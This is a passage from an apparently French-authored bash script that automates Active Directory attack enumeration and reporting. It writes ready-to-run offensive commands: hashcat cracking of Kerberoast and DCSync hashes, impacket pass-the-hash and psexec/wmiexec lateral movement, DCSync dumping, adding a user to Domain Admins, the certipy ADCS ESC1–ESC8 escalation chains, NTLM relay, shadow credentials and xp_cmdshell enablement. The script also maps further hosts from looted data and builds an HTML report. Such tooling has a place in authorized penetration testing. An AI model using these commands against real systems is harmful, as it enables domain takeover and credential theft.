    {
      echo "## Kerberoast TGS (hashcat mode 13100)"
      echo "hashcat -m 13100 kerberos/kerberoast_hashes.txt $rockyou --force"
      echo "john --wordlist=$rockyou kerberos/kerberoast_hashes.txt"
      echo ""
    } >> "$hints_file"
  fi

  if [ -s attack_checks/secretsdump_dcsync.txt ] && \
     grep -qE '^[^:]+:[0-9]+:[a-f0-9]{32}:' attack_checks/secretsdump_dcsync.txt 2>/dev/null; then
    found_any=1
    good "NTLM hashes from DCSync -> hashcat mode 1000"
    {
      echo "## NTLM Hashes (DCSync / secretsdump)"
      echo "# Extract NT hashes:"
      echo "cut -d: -f4 attack_checks/secretsdump_dcsync.txt | sort -u > ntlm_hashes.txt"
      echo "hashcat -m 1000 ntlm_hashes.txt $rockyou --force"
      echo "john --format=NT --wordlist=$rockyou ntlm_hashes.txt"
      echo ""
      echo "# Pass-the-Hash with known NT hash:"
      echo "impacket-psexec -hashes :<NT_HASH> ${DOMAIN}/Administrator@$TARGET"
      echo "impacket-wmiexec -hashes :<NT_HASH> ${DOMAIN}/Administrator@$TARGET"
      echo "evil-winrm -i $TARGET -u Administrator -H <NT_HASH>"
      echo ""
    } >> "$hints_file"
  fi

  if [ -s dotnet_juicy.txt ] && grep -qE 'password|secret|token' dotnet_juicy.txt 2>/dev/null; then
    found_any=1
    {
      echo "## .NET Binary Secrets (potential cleartext creds)"
      echo "# Review: dotnet_juicy.txt  dotnet_il_hits.txt"
      echo ""
    } >> "$hints_file"
  fi

  if [ "$found_any" = "1" ]; then
    HASH_HINTS_DONE=1
    good "Hash cracking hints written: $hints_file"
  else
    log "No hashes collected yet -> hash hints will be minimal."
  fi
}

# ============================================================
# Hints de mouvement latéral post-auth
# ============================================================
phase_postauth_hints() {
  if [ "$POSTAUTH_HINTS" != "1" ]; then
    log "POSTAUTH_HINTS=0 -> skipping post-auth hints"
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "Hints post-auth ignorés (pas d'identifiants confirmés)."
    return
  fi

  section "Phase 10 : hints de mouvement latéral post-auth"
  local hints_file="attack_checks/postauth_hints.txt"
  local U="${AD_USER_BEST##*\\}"
  U="${U%@*}"

  {
    echo "# Référence de commandes de mouvement latéral post-auth"
    echo "# Generated: $(date)"
    echo "# Target: $TARGET | Domain: $DOMAIN | User: $U"
    echo ""
    echo "## SMB Exec (try in order)"
    echo "impacket-psexec '${DOMAIN}/${U}:${AD_PASS}@${TARGET}'"
    echo "impacket-smbexec '${DOMAIN}/${U}:${AD_PASS}@${TARGET}'"
    echo "impacket-wmiexec '${DOMAIN}/${U}:${AD_PASS}@${TARGET}'"
    echo "impacket-atexec '${DOMAIN}/${U}:${AD_PASS}@${TARGET}' whoami"
    echo ""
    if [ "$WINRM_AUTH_OK" = "1" ] || [ "$CTX_WINRM" = "1" ]; then
      echo "## WinRM Shell (port 5985/5986 open)"
      echo "evil-winrm -i $TARGET -u '${U}' -p '${AD_PASS}'"
      echo ""
    fi
    if [ "$MSSQL_AUTH_OK" = "1" ] || [ "$CTX_MSSQL" = "1" ]; then
      echo "## MSSQL Client"
      echo "impacket-mssqlclient -windows-auth '${DOMAIN}/${U}:${AD_PASS}@${TARGET}'"
      echo "# xp_cmdshell (if enabled): EXEC xp_cmdshell 'whoami'"
      echo "# Enable: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
      echo ""
    fi
    echo "## Pass-the-Ticket (if TGT captured)"
    if [ -s "attack_checks/${U}.ccache" ]; then
      echo "export KRB5CCNAME=\$(pwd)/attack_checks/${U}.ccache"
      echo "impacket-psexec -k -no-pass '${DOMAIN}/${U}@${DC}'"
      echo "impacket-wmiexec -k -no-pass '${DOMAIN}/${U}@${DC}'"
    fi
    echo ""
    echo "## Dump SAM/LSA (after psexec/wmiexec shell)"
    echo "impacket-secretsdump '${DOMAIN}/${U}:${AD_PASS}@${TARGET}'"
    echo ""
    echo "## RDP (port 3389)"
    echo "xfreerdp /u:'${U}' /p:'${AD_PASS}' /v:${TARGET} /cert:ignore /dynamic-resolution"
    echo "rdesktop -u '${U}' -p '${AD_PASS}' -d '${DOMAIN}' ${TARGET}"
    echo ""
    echo "## LDAP / AD Privesc"
    echo "# Check writable ACLs:"
    echo "bloodyAD -d $DOMAIN -u '${U}' -p '${AD_PASS}' --host $DC --dc-ip $TARGET get writable"
    echo "# Add user to group:"
    echo "bloodyAD -d $DOMAIN -u '${U}' -p '${AD_PASS}' --host $DC --dc-ip $TARGET add groupMember 'Domain Admins' '${U}'"
    echo ""
    echo "## DCSync (if replication rights)"
    echo "impacket-secretsdump '${DOMAIN}/${U}:${AD_PASS}@${TARGET}' -just-dc-ntlm"
    echo ""
    echo "## ADCS / certipy-ad Attack Paths"
    if [ "$ADCS_ENUM_DONE" = "1" ]; then
      local _ca="${CERTIPY_CA_NAME:-<CA_NAME>}"
      echo "# Full results : adcs/certipy_find.log"
      echo "# ESC flags    : ${CERTIPY_ESC_FLAGS:-<check log>}"
      echo "# CA Name      : ${_ca}"
      echo ""
      echo "# ESC1 — Enrollee Supplies Subject (requestable SAN)"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template <TEMPLATE> -upn 'Administrator@${DOMAIN}'"
      echo "certipy-ad auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $TARGET"
      echo ""
      echo "# ESC2 — Any Purpose EKU"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template <TEMPLATE>"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template User -on-behalf-of '${DOMAIN}\\Administrator' -pfx <cert.pfx>"
      echo ""
      echo "# ESC3 — Enrollment Agent"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template <EnrollmentAgentTemplate>"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template <TEMPLATE> -on-behalf-of '${DOMAIN}\\Administrator' -pfx agent.pfx"
      echo ""
      echo "# ESC4 — Vulnerable Template ACL (write permissions)"
      echo "certipy-ad template -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -template <TEMPLATE> -save-old"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template <TEMPLATE> -upn 'Administrator@${DOMAIN}'"
      echo "certipy-ad template -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -template <TEMPLATE> -configuration <saved.json>  # restore"
      echo ""
      echo "# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template User -upn 'Administrator@${DOMAIN}'"
      echo ""
      echo "# ESC7 — Manage CA / Manage Certificates officer"
      echo "certipy-ad ca -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -add-officer '${U}'"
      echo "certipy-ad ca -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -enable-template SubCA"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -template SubCA -upn 'Administrator@${DOMAIN}'"
      echo "certipy-ad ca -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -issue-request <REQUEST_ID>"
      echo "certipy-ad req -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -ca '${_ca}' -retrieve <REQUEST_ID>"
      echo ""
      echo "# ESC8 — NTLM relay to AD CS HTTP (Web Enrollment)"
      echo "# Terminal 1 — relay:"
      echo "certipy-ad relay -target 'http://${DC}/certsrv/certfnsh.asp' -template DomainController"
      echo "# Terminal 2 — coerce (PetitPotam / PrinterBug):"
      echo "impacket-ntlmrelayx -t 'http://${DC}/certsrv/certfnsh.asp' --adcs --template DomainController"
      echo ""
      echo "# Shadow Credentials (KeyCredentialLink write)"
      echo "certipy-ad shadow auto -u '${U}@${DOMAIN}' -p '${AD_PASS}' -dc-ip $TARGET -account <TARGET_ACCOUNT>"
      echo "# Check: adcs/certipy_shadow.log"
      echo ""
      echo "# Authenticate with obtained certificate"
      echo "certipy-ad auth -pfx <cert.pfx> -domain $DOMAIN -dc-ip $TARGET"
      echo "# Pass-the-hash with obtained NT hash:"
      echo "impacket-psexec -hashes :<NT_HASH> '${DOMAIN}/Administrator@${TARGET}'"
    fi
  } > "$hints_file"

  POSTAUTH_HINTS_DONE=1
  good "Post-auth hints written: $hints_file"
}

# ============================================================
# Découverte d'hôtes additionnels
# ============================================================
phase_host_discovery() {
  section "Phase : découverte d'hôtes additionnels"
  mkdir -p hosts_discovery

  local report="hosts_discovery/discovered_hosts.txt"
  local map="hosts_discovery/hosts_map.txt"
  local raw_ips_f="hosts_discovery/raw_ips.txt"
  local raw_names_f="hosts_discovery/raw_names.txt"
  local arp_f="hosts_discovery/arp_cache.txt"
  local pairs_f="hosts_discovery/ip_host_pairs.tsv"

  for f in "$report" "$map" "$raw_ips_f" "$raw_names_f" "$arp_f" "$pairs_f"; do : > "$f"; done

  local dom_esc target_esc pfx4 pfx4_esc dc_lower
  dom_esc="$(printf '%s' "$DOMAIN" | sed 's/\./\\./g')"
  target_esc="$(printf '%s' "$TARGET" | sed 's/\./\\./g')"
  pfx4="$(printf '%s' "$TARGET" | cut -d. -f1-3)"
  pfx4_esc="$(printf '%s' "$pfx4" | sed 's/\./\\./g')"
  dc_lower="$(printf '%s' "$DC" | tr '[:upper:]' '[:lower:]')"

  # ── 1. Extract IPs from all loot files ────────────────────────────────────────
  log "Scanning loot files for IPs..."
  {
    grep -rhoE '\b10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b'             . 2>/dev/null || true
    grep -rhoE '\b172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}\b' . 2>/dev/null || true
    grep -rhoE '\b192\.168\.[0-9]{1,3}\.[0-9]{1,3}\b'                    . 2>/dev/null || true
    grep -rhoE "\b${pfx4_esc}\.[0-9]{1,3}\b"                             . 2>/dev/null || true
  } | grep -vE "^(127\.|0\.0\.|255\.|224\.|${target_esc}$)" | sort -u > "$raw_ips_f"
  log "  Unique IPs in loot: $(wc -l < "$raw_ips_f" | tr -d ' ')"

  # ── 2. ARP / IP neighbor table ────────────────────────────────────────────────
  log "Reading ARP / neighbour cache..."
  {
    if have arp; then
      arp -n 2>/dev/null | awk 'NR>1 && /^[0-9]/{print $1}' || true
    fi
    if have ip; then
      ip neigh show 2>/dev/null | awk '/^[0-9]/{print $1}' || true
    fi
  } | grep -vE "^(127\.|::1|fe80:|${target_esc}$)" | sort -u > "$arp_f"
  if [ -s "$arp_f" ]; then
    good "ARP/neigh: $(wc -l < "$arp_f" | tr -d ' ') host(s)"
    cat "$arp_f" >> "$raw_ips_f"
    sort -u -o "$raw_ips_f" "$raw_ips_f"
  fi

  # ── 3. Extract hostnames from loot ───────────────────────────────────────────
  log "Scanning loot files for hostnames..."
  {
    # FQDN matching domain
    grep -rhoiE "\b[a-zA-Z0-9_-]+\.${dom_esc}\b" . 2>/dev/null || true
    # LDAP dNSHostName attribute
    grep -rhi "dNSHostName:" . 2>/dev/null \
      | grep -oiE "\b[a-zA-Z0-9_-]+\.${dom_esc}\b" || true
    # SPNs: pull the host part of service/host.domain
    grep -rhoiE \
      '(MSSQLSvc|HTTP|RPCSS|TERMSRV|cifs|gc|exchangeMDB|wsman|SMTP|DNS|HOST|GC)/[a-zA-Z0-9._-]+' \
      . 2>/dev/null \
      | grep -oiE '/[a-zA-Z0-9._-]+' | cut -c2- \
      | grep -iE "\.${dom_esc}$" || true
    # DNS AXFR records
    if [ -s dns_enum/axfr.txt ]; then
      grep -oiE "\b[a-zA-Z0-9_-]+\.${dom_esc}\b" dns_enum/axfr.txt 2>/dev/null || true
    fi
    # BloodyAD DNS dump
    if [ -s dns_enum/bloodyad_dnsdump.txt ]; then
      grep -oiE "\b[a-zA-Z0-9_-]+\.${dom_esc}\b" dns_enum/bloodyad_dnsdump.txt 2>/dev/null || true
    fi
  } | tr '[:upper:]' '[:lower:]' | sort -u \
    | grep -viE "^${dc_lower//./\\.}$" > "$raw_names_f"
  log "  Unique hostnames: $(wc -l < "$raw_names_f" | tr -d ' ')"

  # ── 4. Resolve hostnames → IPs via DC DNS ────────────────────────────────────
  if [ -s "$raw_names_f" ] && { have dig || have host; }; then
    log "Resolving $(wc -l < "$raw_names_f" | tr -d ' ') hostnames via $TARGET..."
    while IFS= read -r hname; do
      [ -z "$hname" ] && continue
      local rip=""
      if have dig; then
        rip="$(dig +short +time=2 +tries=1 @"$TARGET" "$hname" A 2>/dev/null \
               | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)"
      fi
      if [ -z "$rip" ] && have host; then
        rip="$(host -W 2 "$hname" "$TARGET" 2>/dev/null \
               | awk '/has address/{print $NF}' | head -1)"
      fi
      printf '%s\t%s\n' "${rip:-UNRESOLVED}" "$hname" >> "$pairs_f"
    done < "$raw_names_f"
  fi

  # ── 5. Reverse-resolve IPs not yet mapped ────────────────────────────────────
  if [ -s "$raw_ips_f" ] && { have dig || have host; }; then
    log "Reverse-resolving IPs..."
    while IFS= read -r ip; do
      [ -z "$ip" ] && continue
      # skip if already mapped from hostname step
      if grep -q "^$(printf '%s' "$ip" | sed 's/\./\\./g')	" "$pairs_f" 2>/dev/null; then
        continue
      fi
      local rdns=""
      if have dig; then
        rdns="$(dig +short +time=2 +tries=1 @"$TARGET" -x "$ip" 2>/dev/null \
                | sed 's/\.$//' | head -1)"
      fi
      if [ -z "$rdns" ] && have host; then
        rdns="$(host -W 2 "$ip" "$TARGET" 2>/dev/null \
                | awk '/pointer/{print $NF}' | sed 's/\.$//' | head -1)"
      fi
      printf '%s\t%s\n' "$ip" "${rdns:-UNKNOWN}" >> "$pairs_f"
    done < "$raw_ips_f"
  fi

  # Deduplicate pairs; remove primary target
  sort -u "$pairs_f" | grep -v "^${target_esc}	" > "${pairs_f}.tmp" \
    && mv "${pairs_f}.tmp" "$pairs_f" || true

  # ── 6. Role detection (uses loot already on disk) ────────────────────────────
  _hd_role() {
    local ip="$1" hname="$2"
    local roles="" hn_lc bare_hn ip_esc hn_esc
    hn_lc="$(printf '%s' "$hname" | tr '[:upper:]' '[:lower:]')"
    bare_hn="$(printf '%s' "$hn_lc" | cut -d. -f1)"
    ip_esc="$(printf '%s' "$ip" | sed 's/\./\\./g')"
    hn_esc="$(printf '%s' "$hn_lc" | sed 's/\./\\./g')"

    # Domain Controller: SRV record OR primaryGroupID:516 block in LDAP
    if grep -qiE "\\b${bare_hn}\\b" \
         dns_enum/srv_ldap_dc.txt dns_enum/host_srv_ldap.txt 2>/dev/null; then
      roles="${roles}DomainController "
    fi
    if [ -s ldap_full.txt ]; then
      if grep -A 25 -i "dNSHostName:.*${bare_hn}" ldap_full.txt 2>/dev/null \
         | grep -q "primaryGroupID: 516"; then
        roles="${roles}DomainController "
      fi
    fi

    # ADCS / PKI
    if grep -rqiE "(${hn_esc}|${ip_esc})" adcs/ 2>/dev/null; then
      roles="${roles}ADCS/PKI "
    fi

    # Services via SPN
    if grep -rqiE "MSSQLSvc/(${hn_esc}|${ip_esc})" . 2>/dev/null; then
      roles="${roles}MSSQL "
    fi
    if grep -rqiE "(exchangeMDB|SmtpSvc|SMTP)/${hn_esc}" . 2>/dev/null; then
      roles="${roles}Exchange "
    fi
    if grep -rqiE "HTTP/${hn_esc}" . 2>/dev/null; then
      roles="${roles}Web/IIS "
    fi
    if grep -rqiE "(cifs|HOST)/${hn_esc}" . 2>/dev/null; then
      roles="${roles}FileServer "
    fi
    if grep -rqiE "wsman/${hn_esc}" . 2>/dev/null; then
      roles="${roles}WinRM "
    fi
    if grep -rqiE "TERMSRV/${hn_esc}" . 2>/dev/null; then
      roles="${roles}RDP "
    fi
    if grep -rqiE "GC/${hn_esc}" . 2>/dev/null; then
      roles="${roles}GlobalCatalog "
    fi

    # BloodHound mention
    if [ -s bloodhound_collect.txt ]; then
      if grep -qi "\\b${bare_hn}\\b" bloodhound_collect.txt 2>/dev/null; then
        roles="${roles}[BH] "
      fi
    fi

    # Deduplicate role tags
    roles="$(printf '%s' "$roles" | tr ' ' '\n' | sort -u | tr '\n' ' ' | sed 's/ $//')"
    [ -z "$roles" ] && roles="Unknown"
    printf '%s' "$roles"
  }

  # ── 7. Build report and map ───────────────────────────────────────────────────
  local found=0
  local seen_f="hosts_discovery/.seen_ips.tmp"
  : > "$seen_f"

  {
    printf '══════════════════════════════════════════════════════\n'
    printf '  ADDITIONAL HOST DISCOVERY REPORT\n'
    printf '  Generated : %s\n' "$(date)"
    printf '  Primary   : %s  (%s)\n' "$TARGET" "$DC"
    printf '══════════════════════════════════════════════════════\n\n'
  } > "$report"

  printf '%-18s %-48s %s\n' "IP" "HOSTNAME" "ROLE" > "$map"
  printf '%-18s %-48s %s\n' \
    "──────────────────" "────────────────────────────────────────────────" "───────────────────────" >> "$map"

  while IFS=$'\t' read -r ip hname; do
    [ -z "$ip" ] && continue
    [ "$ip" = "$TARGET" ] && continue

    # Deduplicate by IP (keep first seen)
    if [ "$ip" != "UNRESOLVED" ]; then
      if grep -qxF "$ip" "$seen_f" 2>/dev/null; then continue; fi
      printf '%s\n' "$ip" >> "$seen_f"
    fi

    local role
    role="$(_hd_role "$ip" "$hname")"

    {
      printf '┌─ HOST ─────────────────────────────────────────────\n'
      printf '│  Hostname : %s\n' "$hname"
      printf '│  IP       : %s\n' "$ip"
      printf '│  Role     : %s\n' "$role"
      printf '└────────────────────────────────────────────────────\n\n'
    } >> "$report"

    printf '%-18s %-48s %s\n' "$ip" "$hname" "$role" >> "$map"
    found=$((found + 1))
  done < "$pairs_f"

  {
    printf '══════════════════════════════════════════════════════\n'
    printf '  Total additional hosts : %d\n' "$found"
    printf '══════════════════════════════════════════════════════\n'
  } >> "$report"

  rm -f "$seen_f" 2>/dev/null || true
  HOSTS_FOUND="$found"

  if [ "$found" -gt 0 ]; then
    good "Discovered $found additional host(s) — $report"
    cat "$map"
  else
    log "No additional hosts found beyond primary target ($TARGET)"
    printf '  [!] No additional hosts discovered beyond %s.\n' "$TARGET" >> "$report"
  fi
}

# ============================================================
# HTML Report Generator
# ============================================================
generate_html_report() {
  section "Generating HTML Report"

  if ! have python3; then
    bad "python3 not available — skipping HTML report"
    return
  fi

  local report_file="report.html"
  local gen_date
  gen_date="$(date)"

  # HTML escape stdin
  _hesc() {
    python3 -c "import sys,html; sys.stdout.write(html.escape(sys.stdin.read()))"
  }

  # Read file with HTML escaping, or placeholder
  _rf() {
    local f="$1"
    if [ -s "$f" ]; then
      _hesc < "$f"
    else
      printf '<span style="color:var(--text-dim);font-style:italic">(vide / introuvable)</span>'
    fi
  }

  # Find nmap result file (try several extensions)
  _nmap_content() {
    local ext
    for ext in txt gnmap xml; do
      if [ -s "nmapresult.$ext" ]; then
        _hesc < "nmapresult.$ext"
        return
      fi
    done
    printf '<span style="color:var(--text-dim);font-style:italic">(introuvable)</span>'
  }

  # Enumerate files inside a directory and render as collapsible blocks
  _dir_content() {
    local d="$1"
    if [ -d "$d" ] && [ -n "$(ls -A "$d" 2>/dev/null)" ]; then
      find "$d" -maxdepth 2 -type f | sort | while IFS= read -r f; do
        if [ -s "$f" ]; then
          local name escaped_content
          name="$(basename "$f")"
          escaped_content="$(_hesc < "$f")"
          printf '<details><summary>%s</summary><pre class="code">%s</pre></details>\n' \
            "$name" "$escaped_content"
        fi
      done
    else
      printf '<span style="color:var(--text-dim);font-style:italic">(empty)</span>'
    fi
  }

  # Status badge: _badge VALUE LABEL
  _badge() {
    local val="$1" label="$2"
    case "$val" in
      1) printf '<span class="badge ok">%s</span>' "$label" ;;
      0) printf '<span class="badge no">%s</span>' "$label" ;;
      *) printf '<span class="badge uk">%s: %s</span>' "$label" "$val" ;;
    esac
  }

  # Counters
  local users_count asrep_count kerberoast_count shares_count kerb_ldap_count
  users_count="$(wc -l < users.txt 2>/dev/null | tr -d ' ' || echo 0)"
  asrep_count="$(grep -c '^\$krb5asrep\$' asrep_roast.txt 2>/dev/null || echo 0)"
  kerberoast_count="$(grep -c '^\$krb5tgs\$' kerberos/kerberoast_hashes.txt 2>/dev/null || echo 0)"
  shares_count="$(wc -l < smb_shares/shares_target.txt 2>/dev/null | tr -d ' ' || echo 0)"
  kerb_ldap_count="$(grep -c '^sAMAccountName:' ldap_kerberoastable.txt 2>/dev/null || echo 0)"

  # Auth / recon state snapshots
  local a_smb="${SMB_AUTH_OK:-0}" a_ldap="${LDAP_AUTH_OK:-0}" a_rpc="${RPC_AUTH_OK:-0}"
  local a_winrm="${WINRM_AUTH_OK:-0}" a_mssql="${MSSQL_AUTH_OK:-0}" a_tgt="${GETTGT_OK:-0}"
  local a_sign="${SMB_SIGNING_REQUIRED:-?}"
  local r_nmap="${NMAP_DONE:-0}" r_ntp="${NTP_SYNC_DONE:-0}" r_web="${WEB_ENUM_DONE:-0}"
  local r_bh="${BLOODHOUND_OK:-0}" r_ldd="${LDAPDOMAINDUMP_DONE:-0}" r_dns="${DNS_ENUM_DONE:-0}"
  local r_adcs="${ADCS_ENUM_DONE:-0}" r_bloody="${BLOODYAD_ENUM_DONE:-0}"
  local r_mssql="${MSSQL_ENUM_DONE:-0}" r_snmp="${SNMP_ENUM_DONE:-0}" r_ftp="${FTP_ENUM_DONE:-0}"
  local r_ldaps="${LDAPS_ENUM_DONE:-0}" r_gpo="${GPO_PARSE_DONE:-0}"
  local r_sd="${SECRETSDUMP_DONE:-0}" r_spray="${SPRAY_DONE:-0}"

  # Card color based on interesting findings
  local asrep_color="blue"; [ "${asrep_count:-0}" -gt 0 ] 2>/dev/null && asrep_color="red"
  local kerb_color="blue";  [ "${kerberoast_count:-0}" -gt 0 ] 2>/dev/null && kerb_color="yellow"

  {
    # ── HTML head ──────────────────────────────────────────────────────────────
    printf '<!DOCTYPE html>\n<html lang="fr">\n<head>\n<meta charset="UTF-8">\n'
    printf '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
    printf '<title>AD Report — %s — %s</title>\n' "$TARGET" "$DOMAIN"

    cat << 'EOCSS'
<style>
/* ═══════════════════════════════════════════════════════════
   Rapport d'énumération AD — feuille de style enrichie
   ═══════════════════════════════════════════════════════════ */
:root {
  --bg:      #0d1117;
  --bg2:     #161b22;
  --bg3:     #21262d;
  --bg4:     #2d333b;
  --border:  #30363d;
  --text:    #e6edf3;
  --dim:     #7d8590;
  --green:   #3fb950;
  --red:     #f85149;
  --yellow:  #e3b341;
  --blue:    #58a6ff;
  --purple:  #bc8cff;
  --orange:  #ffa657;
  --cyan:    #39d9d9;
  --sw: 242px;
  --r: 8px;
  --ease: cubic-bezier(.4,0,.2,1);
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { scroll-behavior: smooth; }
body {
  background: var(--bg); color: var(--text);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
  font-size: 14px; line-height: 1.5; display: flex; min-height: 100vh;
}
a { color: var(--blue); text-decoration: none; }
a:hover { text-decoration: underline; }

/* ── Sidebar ──────────────────────────────────────────────── */
#sidebar {
  width: var(--sw); background: var(--bg2);
  border-right: 1px solid var(--border);
  position: fixed; top: 0; left: 0; height: 100vh;
  overflow-y: auto; z-index: 200;
  display: flex; flex-direction: column;
}
.sb-head {
  padding: 14px 16px 12px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}
.sb-title { display: flex; align-items: center; gap: 9px; margin-bottom: 11px; }
.sb-logo {
  width: 30px; height: 30px; border-radius: 7px; flex-shrink: 0;
  background: linear-gradient(135deg, #1f6feb, #8957e5);
  display: flex; align-items: center; justify-content: center;
  font-size: 15px;
}
.sb-title h1 { font-size: 13px; font-weight: 700; line-height: 1.2; }
.sb-title h1 small { display: block; font-size: 10px; color: var(--dim); font-weight: 400; margin-top: 1px; word-break: break-all; }
#q {
  width: 100%; padding: 6px 10px 6px 28px; background: var(--bg3);
  border: 1px solid var(--border); border-radius: 6px;
  color: var(--text); font-size: 12px; outline: none;
  transition: border-color .15s var(--ease);
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%237d8590' viewBox='0 0 16 16'%3E%3Cpath d='M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.415l-3.868-3.833zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z'/%3E%3C/svg%3E");
  background-repeat: no-repeat; background-position: 9px center;
}
#q::placeholder { color: var(--dim); }
#q:focus { border-color: var(--blue); }
.sb-nav { flex: 1; padding: 4px 0 8px; }
.sb-grp-label {
  font-size: 10px; text-transform: uppercase; letter-spacing: .12em;
  color: var(--dim); padding: 10px 16px 3px;
  display: flex; align-items: center; gap: 6px;
}
.sb-grp-label::after { content: ''; flex: 1; height: 1px; background: var(--border); margin-left: 4px; }
#sidebar ul { list-style: none; }
#sidebar ul li a {
  display: flex; align-items: center; gap: 7px;
  padding: 5px 14px 5px 18px; color: var(--dim); font-size: 12px;
  border-left: 2px solid transparent;
  transition: color .12s, background .12s, border-color .12s;
}
#sidebar ul li a .ni { font-size: 12px; width: 15px; flex-shrink: 0; }
#sidebar ul li a:hover { color: var(--text); background: rgba(255,255,255,.04); text-decoration: none; }
#sidebar ul li a.active {
  color: var(--blue); background: rgba(88,166,255,.07);
  border-left-color: var(--blue);
}
.sb-footer {
  margin-top: auto; padding: 10px 12px;
  border-top: 1px solid var(--border);
  display: flex; gap: 6px; flex-shrink: 0;
}
.sb-btn {
  flex: 1; padding: 5px 0; background: var(--bg3); border: 1px solid var(--border);
  border-radius: 5px; color: var(--dim); font-size: 11px; cursor: pointer;
  transition: all .15s; text-align: center;
}
.sb-btn:hover { background: var(--bg4); color: var(--text); }
.sb-hint {
  text-align: center; font-size: 10px; color: var(--dim);
  padding: 4px 0 2px; letter-spacing: .03em;
}

/* ── Main ─────────────────────────────────────────────────── */
#main { margin-left: var(--sw); flex: 1; padding: 24px 30px; max-width: calc(100% - var(--sw)); }

/* ── Page header ──────────────────────────────────────────── */
.page-header {
  background: linear-gradient(160deg, var(--bg2) 0%, #1c2333 100%);
  border: 1px solid var(--border);
  border-radius: var(--r); padding: 22px 26px; margin-bottom: 20px;
  position: relative; overflow: hidden;
}
.page-header::before {
  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
  background: linear-gradient(90deg, var(--blue) 0%, var(--purple) 50%, var(--cyan) 100%);
}
.page-header h1 {
  font-size: 21px; font-weight: 700; letter-spacing: -.01em;
  background: linear-gradient(90deg, var(--cyan), var(--blue) 60%);
  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  background-clip: text; margin-bottom: 10px;
}
.meta-row {
  display: flex; flex-wrap: wrap; gap: 4px 20px;
  font-size: 12px; color: var(--dim); margin-bottom: 14px;
}
.meta-row span { display: flex; align-items: center; gap: 4px; }
.meta-row b { color: var(--text); }
.badge-row { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 12px; }
.recon-row {
  padding-top: 12px; border-top: 1px solid var(--border);
  display: flex; flex-wrap: wrap; align-items: center; gap: 4px;
}
.rl { font-size: 10px; text-transform: uppercase; letter-spacing: .08em; color: var(--dim); margin-right: 3px; }

/* ── Cards ────────────────────────────────────────────────── */
.cards {
  display: grid; grid-template-columns: repeat(auto-fill, minmax(155px, 1fr));
  gap: 13px; margin-bottom: 22px;
}
.card {
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: var(--r); padding: 18px 12px; text-align: center;
  position: relative; overflow: hidden;
  transition: transform .18s var(--ease), box-shadow .18s var(--ease);
  cursor: default;
}
.card:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,.45); }
.card::after {
  content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 3px;
  border-radius: 0 0 var(--r) var(--r);
}
.card.blue::after   { background: var(--blue); }
.card.red::after    { background: var(--red); }
.card.yellow::after { background: var(--yellow); }
.card.green::after  { background: var(--green); }
.card.purple::after { background: var(--purple); }
.card.orange::after { background: var(--orange); }
.card.orange .val   { color: var(--orange); }
.card .val {
  font-size: 42px; font-weight: 800; line-height: 1;
  font-variant-numeric: tabular-nums; letter-spacing: -.02em;
}
.card.blue .val   { color: var(--blue); }
.card.red .val    { color: var(--red); }
.card.yellow .val { color: var(--yellow); }
.card.green .val  { color: var(--green); }
.card.purple .val { color: var(--purple); }
.card .lbl { font-size: 11px; color: var(--dim); margin-top: 5px; }

@keyframes pulse-glow {
  0%,100% { box-shadow: 0 0 0 0 rgba(248,81,73,.25); }
  50%      { box-shadow: 0 0 0 7px rgba(248,81,73,0); }
}
.card.red.crit { animation: pulse-glow 2.2s ease infinite; }

/* ── Sections ─────────────────────────────────────────────── */
.section {
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: var(--r); margin-bottom: 13px; overflow: hidden;
}
.section-hdr {
  display: flex; align-items: center; gap: 10px;
  padding: 11px 18px; background: var(--bg3);
  border-bottom: 1px solid var(--border);
  cursor: pointer; user-select: none;
  transition: background .12s var(--ease);
}
.section-hdr:hover { background: var(--bg4); }
